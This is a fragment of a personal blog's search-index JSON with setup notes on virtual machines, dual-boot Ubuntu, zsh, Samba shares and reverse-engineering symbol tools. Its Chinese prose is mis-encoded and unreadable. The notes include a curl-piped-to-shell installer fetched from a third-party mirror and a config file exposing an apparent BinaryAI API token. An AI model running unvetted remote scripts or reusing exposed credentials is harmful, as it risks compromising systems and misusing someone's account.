è™šæ‹Ÿæœºvmnetwork8](https://blog.51cto.com/hutiewei/3054468)\n\n```\nä»¥ä¸»æœºä¸ºä¾‹ï¼Œä¾æ¬¡æ‰“å¼€é˜²ç«å¢™ï¼Œé«˜çº§è®¾ç½®ï¼Œå…¥ç«™è§„åˆ™ï¼Œæ–°å»ºè§„åˆ™ï¼Œè‡ªå®šä¹‰ï¼Œä»»ä½•åè®®ä»»ä½•ç«¯å£ï¼Œåˆ°äº†é€‰æ‹©ipçš„æ—¶å€™ï¼Œæœ¬åœ°ipé€‰æ‹©ä»»ä½•æœ¬åœ°ipï¼Œè¿œç¨‹ipæ·»åŠ ä¸Šè™šæ‹Ÿæœºçš„å±€åŸŸç½‘ipï¼Œä¸‹ä¸€æ­¥ï¼Œé€‰å…è®¸è¿æ¥ï¼Œæå®šã€‚\n```\n\n### ç£ç›˜æ‰©å®¹\n\n[vmwareä¸­linuxä½¿ç”¨gpartedè°ƒæ•´ç£ç›˜å¤§å°å¹¶è®¾ç½®swapåˆ†åŒº](https://blog.csdn.net/weixin_39309257/article/details/106474067)\n\nå‚è€ƒä¸Šæ–‡ï¼Œä¸»è¦æ­¥éª¤å¦‚ä¸‹ï¼š\n\n1. å°†è™šæ‹Ÿæœºå…³æœºï¼Œåœ¨è™šæ‹Ÿæœºè®¾ç½®ä¸­é€‰æ‹©æ‰©å±•ç£ç›˜ï¼Œè®¾ç½®åˆé€‚çš„å¤§å°\n2. è®¾ç½®å®Œæ¯•åï¼Œå¯åŠ¨è™šæ‹Ÿæœºï¼Œå®‰è£…gparted\n3. åœ¨gpartedä¸­ï¼Œåˆ é™¤å¤¹åœ¨æ ¹ç›®å½•åˆ†åŒºå’Œæ–°åˆ†åŒºä¹‹é—´çš„extendedåˆ†åŒºï¼ˆå…ˆ/dev/sda5ï¼Œå/dev/sda2ï¼‰\n4. æ‰©å±•æ ¹ç›®å½•åˆ†åŒºï¼Œå¹¶é¢„ç•™extendedåˆ†åŒºå¤§å°çš„ç£ç›˜\n5. åœ¨æœ€åæœªåˆ†é…çš„ç£ç›˜ä¸­ï¼Œå…ˆnewå‡ºä¸€ä¸ªextendedçš„åˆ†åŒºï¼Œç„¶åå†åœ¨è¿™ä¸ªextendedçš„åˆ†åŒºé‡Œnewä¸€ä¸ªé€»è¾‘åˆ†åŒºï¼Œå¹¶ä¸”file systemé€‰æ‹©ä¸ºlinux-swap\n6. ç‚¹å‡»æ ¹ç›®å½•åˆ†åŒºï¼Œé€‰æ‹©ç»¿è‰²çš„é’©é’©ï¼Œå®Œæˆä¿å­˜\n\n\n\n## virtual box\n\nvirtual boxå¢å¼ºåŠŸèƒ½\n\nå®‰è£…å¢å¼ºåŠŸèƒ½ï¼š[VirtualBoxè™šæ‹Ÿæœº Ubuntu 16.04.3 LTS å®‰è£…å¢å¼ºåŠŸèƒ½]( https://blog.csdn.net/caoleiwe/article/details/78583676)\n\nè®¾ç½®å…±äº«æ–‡ä»¶å¤¹ï¼š [åˆ†äº«Virtualbox Ubuntu å…±äº«æ–‡ä»¶å¤¹ã€è‡ªåŠ¨æŒ‚è½½çš„ä¸€äº›é—®é¢˜](https://blog.csdn.net/skylake_/article/details/53132499)\n\n\n\n# win10 å®‰è£…ubuntu1804åŒç³»ç»Ÿ\n\nè¿‡ç¨‹ä¸»è¦å‚è€ƒäº†ä»¥ä¸‹ä¸¤ç¯‡åšå®¢ï¼š\n\n[win10ä¸‹è£…ubuntuåŒç³»ç»Ÿï¼ˆå…Uç›˜ï¼‰](https://www.jianshu.com/p/417c1001a559)\n\n[Windows + Linux åŒç³»ç»Ÿçš„å®‰è£…](https://blog.csdn.net/fanxueya1322/article/details/90205143)\n\n## ç¬¬ä¸€æ­¥ï¼šåˆ¶ä½œå¯åŠ¨uç›˜\n\næˆ‘ä½¿ç”¨çš„ultraISOï¼Œç½‘ä¸Šå¾ˆå¤šæ•™ç¨‹ã€‚\n\n## ç¬¬äºŒæ­¥ï¼šåˆ›å»ºç£ç›˜åˆ†åŒº\n\nåœ¨windowsä¸­ç©ºå‡º500Gï¼ˆæˆ‘è¦ç»å¸¸ç”¨ubuntuç³»ç»Ÿï¼Œæ‰€ä»¥ç©ºå‡ºçš„å¤šï¼Œå®é™…ä¸Š50Gä¹Ÿå¯ä»¥ï¼‰æœªåˆ†é…çš„ç£ç›˜ã€‚\n\næ¡Œé¢ä¸Šç”µè„‘å›¾æ ‡--ã€‹å³é”®é€‰æ‹©ç®¡ç†--ã€‹ç£ç›˜ç®¡ç†ï¼Œç„¶ååˆ’åˆ†ä¸€å—æœªåˆ†é…çš„ç£ç›˜ï¼ˆåœ¨è¦åˆ†é…çš„ç£ç›˜ä¸Šå³é”®--ã€‹å‹ç¼©å·ï¼‰ã€‚\n\n## ç¬¬ä¸‰æ­¥ï¼šç¦ç”¨å¿«é€Ÿå¯åŠ¨\n\næ§åˆ¶é¢æ¿--ã€‹ç³»ç»Ÿå’Œå®‰å…¨--ã€‹ç”µæºé€‰é¡¹--ã€‹é€‰æ‹©ç”µæºæŒ‰é’®çš„åŠŸèƒ½--ã€‹æ›´æ”¹å½“å‰ä¸å¯ç”¨çš„è®¾ç½®ã€‚å°†è¯¥ç•Œé¢çš„â€œå¯ç”¨å¿«é€Ÿå¯åŠ¨â€é€‰é¡¹å‰çš„å‹¾å»æ‰ã€‚ä¿å­˜ä¿®æ”¹ã€‚\n\n## ç¬¬å››æ­¥ï¼šå…³é—­å®‰å…¨å¯åŠ¨\n\né‡å¯è¿›å…¥biosè®¾ç½®\n\n## ç¬¬äº”æ­¥ï¼šå®‰è£…è¿‡ç¨‹\n\né‡å¯è¿›å…¥biosï¼Œå¹¶é€‰æ‹©ä»uç›˜å¯åŠ¨ã€‚å…¶ä¸­åªæœ‰ä»¥ä¸‹ä¸€ç‚¹éœ€è¦æ³¨æ„ã€‚\n\næœ‰ä¸€æ­¥é€‰æ‹©æ˜¯å¦å®‰è£…åˆ°windowsæ—è¾¹æ—¶ï¼š\n\n1ã€é€‰æ‹©along side windowsï¼Œç»§ç»­ä¸‹ä¸€æ­¥ä¸éœ€è¦æ‰‹åŠ¨åˆ’åˆ†ç£ç›˜ï¼Œå®ƒå°±è‡ªåŠ¨æŠŠæˆ‘ä¹‹å‰ç©ºå‡ºçš„500Gç»™ç”¨äº†ã€‚ï¼ˆä¸çŸ¥é“ä¸ºå•¥ï¼Œè¯¯æ‰“è¯¯æ’å‘ç°è¿™æ ·ä¹Ÿå¯ä»¥å®‰è£…ä¸ŠåŒç³»ç»Ÿï¼‰\n\n2ã€å¦‚æœæƒ³è‡ªå·±åˆ’åˆ†ç£ç›˜çš„è¯ï¼Œä¸€å®šè¦è®°å¾—é€‰â€œå…¶ä»–â€ï¼Œç„¶åè®¾ç½®åˆ†åŒºã€‚\n\n## å†æ¬¡å¯åŠ¨\n\næˆ‘ç”¨çš„æ–¹æ³•æ¯”è¾ƒç¬¨ï¼Œåœ¨å¼€æœºçš„ä¸€ç¬é—´ï¼Œéœ€è¦ä¸€ç›´æŒ‰ESCé”®ï¼ˆæƒ æ™®ç”µè„‘ï¼‰è¿›å…¥å¼€æœºé€‰é¡¹ï¼Œç„¶åé€‰æ‹©F9ã€‚è¿›å…¥F9åå°±å¯ä»¥é€‰æ‹©æ˜¯å¯åŠ¨windowsè¿˜æ˜¯å¯åŠ¨ubuntuå•¦ã€‚\n\n# windowsè¿è¡ŒWSL\n\n[windows ä¸Šè¿è¡Œlinux](https://www.jianshu.com/p/e81fe9db1ebb)\n\n[ä¸ç”¨è£…åŒç³»ç»Ÿï¼Œç›´æ¥åœ¨ Windows ä¸Šä½“éªŒ Linuxï¼šWindows Subsystem for Linux](https://sspai.com/post/43813)\n\n# clashé€æ˜ç½‘å…³\n\n[clash githubä¸‹è½½åœ°å€](https://github.com/Fndroid/clash_for_windows_pkg)\n\n[clash for windowsæ–‡æ¡£ä»‹ç»](https://docs.cfw.lbyczf.com/)\n\n[clashåŸºç¡€é…ç½®æ•™ç¨‹](https://v2xtls.org/clash-for-windows%E9%85%8D%E7%BD%AEv2ray%E6%95%99%E7%A8%8B/)\n\n[clashé€æ˜è·¯ç”±](https://blog.serenader.me/shi-yong-pve-yun-xing-clash-pang-lu-you-xu-ni-ji-shi-xian-tou-ming-dai-li)\n\n# æ–‡ä»¶ç®¡ç†å™¨ä¹‹QTTabBar\n\nå°‘æ•°æ´¾çš„[è¿™ç¯‡æ–‡ç« ](https://sspai.com/post/52521)ä»‹ç»å¾—å¾ˆå…¨é¢\n\nå»ºè®®åœ¨[å®˜æ–¹ç½‘ç«™](http://qttabbar.wikidot.com/)ä¸­ä¸‹è½½åŸç‰ˆ\n\nå®‰è£…å®Œæˆåï¼Œå¦‚æœç½‘ç»œä¸è¡Œæ— æ³•ä¸‹è½½ä¸­æ–‡è¯­è¨€åŒ…ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥åœ¨[è¿™ä¸ªé“¾æ¥](https://github.com/yfdyh000/QTTabBar_zh-CN)ä¸‹è½½è¯­è¨€åŒ…ä½¿ç”¨ã€‚\n\n# å‘½ä»¤è¡ŒCmder\n\nå»ºè®®åœ¨[å®˜æ–¹ç½‘ç«™](https://cmder.net/)ä¸‹è½½æœ€æ–°ç‰ˆï¼Œç„¶åå‚è€ƒçŸ¥ä¹[è¿™ç¯‡æ–‡ç« ](https://zhuanlan.zhihu.com/p/71706782)å®‰è£…ï¼Œå®ƒçš„é…ç½®è¿‡ç¨‹å¾ˆè¯¦ç»†ã€‚\n","tags":["windows"],"categories":["Others"]},{"title":"temp","url":"/2019/01/01/temp/","content":"\n\n\n# æ¢å¤ç¬¦å·è¡¨\n\n## lscan -è‡ªåŠ¨æ£€æµ‹äºŒè¿›åˆ¶å’Œå“ªä¸ªåº“æœ€ç›¸è¿‘\n\nhttps://github.com/maroueneboubakri/lscan\n\néœ€è¦å…ˆå®‰è£…[pyelftools](https://github.com/eliben/pyelftools) å’Œ [pefile](https://github.com/erocarrera/pefile)\n\n```shell\npython ./lscan.py -S .sigçš„ç›®å½• -f è¦æ‰«æçš„äºŒè¿›åˆ¶æ–‡ä»¶\n```\n\n## IDA flair\n\nåœ¨[sig-database](https://github.com/push0ebp/sig-database)ä¸­å¯»æ‰¾åˆé€‚çš„sigæ–‡ä»¶ï¼Œæˆ–è€…è‡ªå·±[åˆ¶ä½œsigæ–‡ä»¶](https://github.com/blingblingxuanxuan/working/blob/master)\n\n## Rizzo\n\n## binaryai\n\n```shell\npip install --upgrade binaryai\nbinaryai install_ida_plugin\n```\n\nC:\\Users\\x00500195\\AppData\\Roaming\\Hex-Rays\\IDA Pro\\cfg\\binaryai.cfg\n\n```\n{\n    \"token\": \"e9e72683-71a5-4e6d-81ed-8bf6b4a76449\",\n    \"url\": \"https://binaryai.tencent.com/api/v3/endpoint\",\n    \"topk\": 10,\n    \"minsize\": 5,\n    \"threshold\": 0.90\n}\n```\n\n\n\n\n\n","categories":["Others"]},{"title":"things","url":"/2019/01/01/things/","content":"\n# 2020\n\n## 0919\n\nçªå‘å¥‡æƒ³ï¼Œæƒ³è¦æ¡èµ·ä»åˆä¸­å¼€å§‹å°±å¾ˆå–œæ¬¢ä½†ä»é«˜ä¸­æ¯•ä¸šå°±æ²¡å¥½å¥½å­¦è¿‡çš„è¯¾ã€‚æ›²æ›²æŠ˜æŠ˜ç»•äº†ä¸€åœˆåˆä¸€åœˆï¼Œæœ€ç»ˆè¿˜æ˜¯ä¼šå›åˆ°å¿ƒä¸­çš„åŸç‚¹ã€‚ä¸€ä¸ªäººä¸€è¾ˆå­åªåšä¸€ä»¶äº‹ï¼Œå¹¶ä¸”èƒ½ä¸€ç›´åšå¥½ï¼Œä¹Ÿæ˜¯ä¸€ä»¶å¾ˆäº†ä¸èµ·çš„äº‹æƒ…å•Šã€‚\n\n## 1117\n\næ—¶é—´è¿‡å¾—å¯çœŸå¿«ã€‚ä¸€å¤©å¤©éƒ½å¹²äº†å•¥å‘¢ã€‚\n\n# 2021\n\n## 0217\n\nä¸€ä¸ªæœˆã€ä¸¤ä¸ªæœˆï¼Œæ—¥å­æ€»æ˜¯è¿‡å¾—è¿™ä¹ˆå¿«ï¼Œä¸€ä¸ç•™ç¥ä»Šå¹´å°±å¿«è¿‡å»å…­åˆ†ä¹‹ä¸€äº†ã€‚\n\n\n# 2022\n\n## 0702 - ubuntu20.04å®‰è£…zsh\n\n> 18.04ç”¨è¿™ä¸ªæ–¹æ³•ä¹Ÿå¯ä»¥æˆåŠŸå®‰è£…ï¼ˆ22/7/3ï¼‰\n\n\nå‚è€ƒé“¾æ¥ï¼š[Ubuntu20.04é…ç½®oh-my-zshä»¥åŠä¸€äº›å¥½ç”¨çš„æ’ä»¶](https://m.tqwba.com/x_d/jishu/280778.html)\n\n```bash\nsudo apt install zsh\nchsh -s /bin/zsh\nsh -c \"$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)\"\ngit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh}/plugins/zsh-autosuggestions\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh}/plugins/zsh-syntax-highlighting\nsudo apt-get install autojump\nvim ~/.zshrc\n# ## æ›´æ”¹é…ç½®æ–‡ä»¶ä¸­çš„è¿™ä¸¤é¡¹\n# ZSH_THEME=\"ys\"\n# plugins=(git zsh-autosuggestions zsh-syntax-highlighting)\n# ##æœ€åä¸€è¡ŒåŠ ä¸Šè¿™ä¸ªï¼š\n# . /usr/share/autojump/autojump.sh\nsource ~/.zshrc\nreboot\n```\n\n## 1020 - windowså®‰è£…sambaå®ç°æ–‡ä»¶å¤¹å…±äº«\n\n### windowsä¾§çš„è®¾ç½®\n\n[Windows 10 Sambaæ–‡ä»¶å…±äº«çš„è®¾ç½®æ–¹æ³•ï¼Œè§£å†³ä¸èƒ½è®¿é—®å’Œå¯†ç é”™è¯¯çš„é—®é¢˜](https://www.51cto.com/article/658846.html)\n\nè¯¦ç»†çš„æ“ä½œè§ä»¥ä¸Šé“¾æ¥ï¼Œæ€»ç»“å¦‚ä¸‹å‡ ä¸ªç‚¹ï¼š\n\n1. åœ¨æ§åˆ¶é¢æ¿çš„â€œå¯ç”¨æˆ–å…³é—­windowsåŠŸèƒ½â€ä¸­ï¼Œé€‰ä¸­smbç›¸å…³çš„å¤é€‰æ¡†\n2. åœ¨è®¡ç®—æœºç®¡ç†çš„â€œæœ¬åœ°ç”¨æˆ·å’Œç»„â€ä¸­ï¼Œæ–°å¢ä¸€ä¸ªç”¨æˆ·ï¼Œå¦‚åç§°å«â€œshareâ€ï¼Œè®¾ç½®å¯†ç ï¼Œé€‰ä¸­â€œç”¨æˆ·ä¸èƒ½æ›´æ”¹å¯†ç â€å’Œâ€œå¯†ç æ°¸ä¸è¿‡æœŸâ€ï¼Œæœ€åç‚¹åˆ›å»º\n3. åŒå‡»æ–°å¢çš„ç”¨æˆ·ï¼Œåœ¨éš¶å±äºä¸­ï¼Œå°†å…¶æ·»åŠ åˆ°ç»„â€œUserâ€ä¸­\n4. åˆ›å»ºéœ€è¦å…±äº«çš„æ–‡ä»¶å¤¹ï¼Œå…±äº«ç»™åˆšåˆšåˆ›å»ºçš„ç”¨æˆ·â€œshareâ€ï¼Œå…è®¸å…¶è¯»å†™\n\n### ubuntuå®¢æˆ·ç«¯ä¾§çš„è®¾ç½®\n\n[åœ¨Linuxç³»ç»Ÿä¸Šé…ç½®Sambaå®¢æˆ·ç«¯ï¼Œè®¿é—®Sambaè¿œç¨‹ç›®å½•](https://www.linuxrumen.com/rmxx/2093.html)\n\n```bash\n# å®‰è£…smbå®¢æˆ·ç«¯\nsudo apt install smbclient\n# è¿æ¥ smbclient //samba_hostname_or_server_ip/share_name -U username\nsmbclient //192.168.133.1/ucore -U share\n# å°†è¿œç¨‹æ–‡ä»¶å¤¹æ˜ å°„åˆ°æœ¬åœ°\n# å®‰è£…cifs\nsudo apt install cifs-utils\n# åˆ›å»ºæœ¬åœ°å¾…æŒ‚è½½ç›®å½•\nmkdir ~/share-ucore\n# æŒ‚è½½  sudo mount -t cifs //samba_hostname_or_server_ip/sharename /mnt/smbmount -o username=username\nsudo mount -t cifs //192.168.133.1/ucore /home/moocos/share-ucore/ -o username=share,passwd=xxx,vers=2.0\n# å¸è½½æŒ‚è½½çš„ç›®å½•\numount ~/share-ucore\n# è®¾ç½®å¼€æœºè‡ªæŒ‚è½½ï¼Œéœ€ä¿è¯æ­¤æ—¶æœªå¤„äºæŒ‚è½½çŠ¶æ€ï¼Œé…ç½®æ–‡ä»¶/etc/fstab\n//192.168.133.1/ucore /home/moocos/share-ucore/ cifs username=share,passwd=xxx,vers=2.0,soft,rw 0 0\n```\n\né‡åˆ°çš„é”™è¯¯åŠè§£å†³æ–¹æ¡ˆï¼š\n\n[smbclient æŠ¥é”™ï¼šprotocol negotiation failed: NT_STATUS_CONNECTION_RESET](https://blog.csdn.net/u013992330/article/details/107123229)\n\n[Linuxï¼šmountå‘½ä»¤å‡ºç°Host is downå¦‚ä½•è§£å†³](https://www.cnblogs.com/linuxprobe-sarah/p/10807577.html)","categories":["Life"]}]